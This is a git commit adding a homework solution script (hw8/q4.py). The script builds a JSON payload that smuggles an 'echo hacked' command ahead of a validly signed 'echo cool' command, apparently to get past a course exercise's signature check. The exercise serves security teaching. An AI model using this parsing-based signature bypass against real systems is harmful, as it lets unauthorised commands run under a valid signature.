554c0a3fb95077955717784b4183abe7cd00889e
Kleinfeld, Ofri(okleinfeld) <okleinfeld@paypal.com>
2018-05-02 12:05:54 +0300

    adds solution to q4

---
+++ hw8/q4.py
@@ -0,0 +1,32 @@
+import json
+
+
+def generate_example():
+    return json.dumps({'command': 'echo cool', 'signature': '007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1'})
+
+
+def generate_exploit():
+    hacked_command = '{"a": {"command": "echo hacked"}, '
+    origin_json_str =  json.dumps({'command': 'echo cool', 'signature': '007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1'})
+    return hacked_command + origin_json_str[1:]
+
+def main(argv):
+    if not 2 <= len(argv) <= 3:
+        print('USAGE: %s [--example] <script-path>' % argv[0])
+        return 1
+    if len(argv) == 2:
+        example, path = False, argv[1]
+    else:
+        example, path = True,  argv[2]
+    if example:
+        script = generate_example()
+    else:
+        script = generate_exploit()
+    with open(path, 'w') as writer:
+        writer.write(script)
+    print('done')
+
+
+if __name__ == '__main__':
+    import sys
+    sys.exit(main(sys.argv))
